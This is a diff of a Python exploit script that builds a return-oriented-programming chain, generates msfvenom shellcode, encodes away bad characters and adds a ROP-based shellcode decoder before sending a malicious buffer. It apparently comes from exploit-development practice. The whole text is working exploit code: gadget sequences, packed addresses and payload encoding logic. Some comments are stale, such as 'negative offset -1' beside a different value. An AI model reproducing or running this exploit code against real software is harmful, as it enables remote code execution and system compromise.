@@ -221,45 +221,13 @@ import sys
 from struct import pack
 
 from modules.msfvenom_module import generatePayload
-from modules.shellcode_module import getShellcode
+from modules.shellcode_module import generateShellcodeDecoder, getShellcode
 
 from modules.util_module import bad_chars, log, checkBadChars, checkNullBytes, sendMalBuff, parse_args, printBuffer, leakFunctionAddress, repeat_bytes
 
 DEBUG = True
 DEBUG_Response = False
 BASE_ADDR_BAD = False
-
-
-def decodeShellcode(encodedShellcode, badCharsList):
-    # NOTE:: Unknown if ill keep this func here, ideally should be in utils or shellcode_module
-
-    # buffer to restore the original shellcode
-    restoreShellcode = b""
-
-    # Generate a list of good chars that are not 0x00 or any char in the badCharsList
-    goodChars = [i for i in range(256) if i not in badCharsList and i != 0x00]
-    log(f"Generated {len(goodChars)} good characters for encoding.", level="*", indent=1)
-
-    # Map each bad char to a unique good char
-    charMap = {bad: good for bad, good in zip(badCharsList, goodChars)}
-
-    # Iterate through the encoded shellcode and replace bad chars with their corresponding good chars
-    for byte in encodedShellcode:
-        if byte in charMap:
-            restoreShellcode += bytes([charMap[byte]])
-        else:
-            restoreShellcode += bytes([byte])
-
-    pass
-
-
-def decodeShellcode(encodedShellcode, bad_indexes, originalShellcode):
-    restored = bytearray(encodedShellcode)
-
-    for index in bad_indexes:
-        restored[index] = originalShellcode[index]
-
-    return bytes(restored)
 
 
 def main():
@@ -467,12 +435,28 @@ def main():
         *************************** Stage 1d: Shellcode Decoding ***************************
         ************************************************************************************
         """
-        rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; ret
+        # rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; ret
         rop += rop_pop_ecx_ret  # pop ecx ; ret
-        rop += pack("<L", (0xFFFFFFFF))  # negative offset -1
+        rop += pack("<L", (0xFFFFF9E5))  # negative offset -1
         rop += rop_sub_eax_ecx_pop_ebx_ret  # sub eax, ecx; pop ebx; ret
-        rop += pack("<L", (0x11110111))  # Load 0x01 in BH -> The original value of the char we needed to replace
-        rop += rop_add_ptrEAX_1_bh_ret  # add [eax+1], bh; ret
+        rop += pack("<L", (0x42424242))  # JUNK into EBX
+        # rop += rop_add_ptrEAX_1_bh_ret  # add [eax+1], bh; ret
+
+        # We're encoding/generating shellcdde here but the decoder is placed later in the rop chain, so we need to generate the shellcode first
+        # Get encoded shellcode, moving forward we will be using the encoded shellcode
+        encoded_shellcode, replacements = getShellcode(
+            encoded=True, bad_chars=bad_chars
+        )  
+
+        # Generate the shellcode decoder and add it to the rop chain
+        rop += generateShellcodeDecoder(
+            rop_pop_ecx=rop_pop_ecx_ret,
+            rop_sub_eax_ecx_pop_ebx=rop_sub_eax_ecx_pop_ebx_ret,
+            rop_add_ptrEAX_1_bh=rop_add_ptrEAX_1_bh_ret,
+            replacements=replacements,
+            encodedShellcode=encoded_shellcode,
+            badChars=bad_chars,
+        )  
 
         """
         ************************************************************************************
@@ -502,10 +486,9 @@ def main():
         offset2 = repeat_bytes("OFFSET.SHELLCODE", offset2Len)  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
         # shellcode = getShellcode(encoded=True)[:20]  # Get encoded shellcode, moving forward we will be using the encoded shellcode
         shellcode = rop_int3_int3_int3_int3_ret
-        encoded_shellcode, replacements = getShellcode(encoded=True)  # Get encoded shellcode, moving forward we will be using the encoded shellcode
         shellcode += encoded_shellcode
         log("Encoded Shellcode", level="+")
-        printBuffer(shellcode, width="db")
+        printBuffer(shellcode, width="dd")
 
         # SHELLCODE ENCODING:
         # The ropchain to decode the shellcode is to be placed before the ESP alignment section
